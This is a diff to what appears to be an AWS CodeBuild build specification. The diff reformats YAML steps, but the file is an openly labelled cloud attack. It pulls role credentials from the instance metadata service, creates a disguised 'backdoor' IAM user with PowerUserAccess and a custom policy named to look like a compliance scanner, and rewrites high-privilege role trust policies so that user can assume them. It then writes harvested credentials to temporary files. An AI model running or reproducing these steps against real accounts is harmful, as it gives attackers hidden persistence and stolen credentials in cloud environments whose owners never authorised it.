@@ -27,15 +27,15 @@ phases:
         # Extract current role credentials from IMDS
         echo "Querying IMDS for role information..."
         curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ || echo "IMDS not accessible (CodeBuild environment)"
-
+      - |
         # Alternative: Extract from environment variables that CodeBuild sets
         echo "Extracting CodeBuild provided credentials..."
         echo "AWS_DEFAULT_REGION: $AWS_DEFAULT_REGION"
         echo "AWS_REGION: $AWS_REGION"
-
+      - |
         # Log current session information
         aws sts get-session-token --duration-seconds 3600 2>/dev/null || echo "Session token extraction failed"
-
+      - |
         # Get caller identity with verbose output
         CURRENT_ARN=$(aws sts get-caller-identity --query Arn --output text)
         ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
@@ -43,7 +43,7 @@ phases:
         echo "Target AWS Account: $ACCOUNT_ID"
 
       - echo "=== Phase 3 Backdoor User Creation ==="
-      - |-
+      - |
         echo "Creating persistent backdoor IAM user..."
 
         # Create backdoor user with innocent-looking name
@@ -77,8 +77,7 @@ phases:
           --user-name "$BACKDOOR_USER" \
           --policy-arn "arn:aws:iam::aws:policy/PowerUserAccess" \
           2>/dev/null || echo "PowerUser policy attachment failed"
-
-      - |-
+      - |
         cat << 'POLICY' > /tmp/backdoor_policy.json
 {
   "Version": "2012-10-17",
@@ -103,8 +102,7 @@ phases:
   ]
 }
 POLICY
-
-      - |-
+      - |
         # Create and attach custom policy
         aws iam create-policy \
           --policy-name "HexalytixComplianceScannerPolicy" \
@@ -118,7 +116,7 @@ POLICY
           2>/dev/null || echo "Custom policy attachment failed"
 
       - echo "=== Phase 4 Alternative Persistence - Role Backdooring ==="
-      - |-
+      - |
         echo "Backdooring existing IAM roles for persistence..."
 
         # List high-privilege roles
@@ -131,8 +129,7 @@ POLICY
 
         # Get current trust policy
         aws iam get-role --role-name "$ROLE_NAME" --query 'Role.AssumeRolePolicyDocument' > /tmp/current_trust_policy.json 2>/dev/null || echo "Failed to get trust policy"
-
-      - |-
+      - |
         cat << 'TRUST_POLICY' > /tmp/backdoored_trust_policy.json
 {
   "Version": "2012-10-17",
@@ -167,8 +164,7 @@ POLICY
   ]
 }
 TRUST_POLICY
-
-      - |-
+      - |
         # Update trust policy to allow backdoor user
         echo "Adding backdoor user to role trust policy..."
         aws iam update-assume-role-policy \
@@ -177,7 +173,7 @@ TRUST_POLICY
           2>/dev/null || echo "Trust policy update failed"
 
       - echo "=== Phase 5 Token Extraction and Credential Harvesting ==="
-      - |-
+      - |
         echo "Extracting and documenting access credentials..."
 
         # Current session credentials
@@ -210,8 +206,7 @@ CREDS
 
           echo "Backdoor credentials documented"
         fi
-
-      - |-
+      - |
         # Extract current temporary credentials from environment
         cat << ENV_CREDS > /tmp/current_session_creds.txt
 # Current CodeBuild Session Credentials
